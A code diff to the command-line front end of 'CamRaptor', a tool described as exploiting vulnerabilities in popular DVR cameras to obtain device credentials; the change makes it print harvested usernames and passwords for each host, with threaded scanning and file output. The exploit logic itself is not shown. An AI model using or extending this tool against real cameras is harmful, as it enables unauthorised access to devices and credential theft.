@@ -32,7 +32,7 @@ from .badges import Badges
 
 
 class CamRaptorCLI(CamRaptor, Badges):
-    description = "."
+    description = "CamRaptor is a tool that exploits several vulnerabilities in popular DVR cameras to obtain device credentials."
     parser = argparse.ArgumentParser(description=description)
     parser.add_argument('--threads', dest='threads', action='store_true', help='Use threads for fastest work.')
     parser.add_argument('--output', dest='output', help='Output result to file.')
@@ -46,11 +46,11 @@ class CamRaptorCLI(CamRaptor, Badges):
 
         if response is not None:
             self.print_process(f"({host}) - accessing camera config...")
-            password = self.exploit(response)
+            username, password = self.exploit(response)
 
-            if password is not None:
-                self.print_process(f"({host}) - extracting admin password...")
-                return f"({host}) - password: {password}"
+            if username is not None and password is not None:
+                self.print_process(f"({host}) - extracting camera credentials...")
+                return f"({host}) - {username}:{password}"
             self.print_error(f"({host}) - config access denied!")
             return None
         self.print_error(f"({host}) - connection rejected!")
